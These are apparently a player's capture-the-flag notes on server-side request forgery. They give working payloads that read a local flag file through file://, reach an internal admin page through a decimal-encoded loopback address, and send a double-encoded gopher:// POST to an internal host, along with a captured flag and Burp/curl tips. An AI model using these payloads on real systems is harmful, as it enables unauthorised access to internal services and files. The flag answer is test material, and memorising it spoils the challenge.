GET /?url=file:///flag1.txt
GET /?url=2130706433/admin.php

GET /?url=gopher%3a%2f%2ffbi.com%3a80%2f_POST%2520%252fadmin.php%2520HTTP%252f1.1%250d%250aHost%253a%252010.113.0.1%253a13201%250d%250aUser-Agent%253a%2520curl%252f8.16.0%250d%250aAccept%253a%2520*%252f*%250d%250aConnection%253a%2520keep-alive%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%253a%252012%250d%250a%250d%250agive_me%253dflag

`flag{31b29495_b989878b_b75ac568}`

# flag3 notes
- curl can use ALL_PROXY environment variable to route requests through a proxy e.g. ALL_PROXY=http://127.0.0.1:8080 curl -i http://example.com
- burp repeater allow request query modifier, first send the request then copy the request to modifer and achieve gopher://
    - add two decoded from blocks from url encoding and paste raw request on the last block
- remember when POST, you need Content-Type header
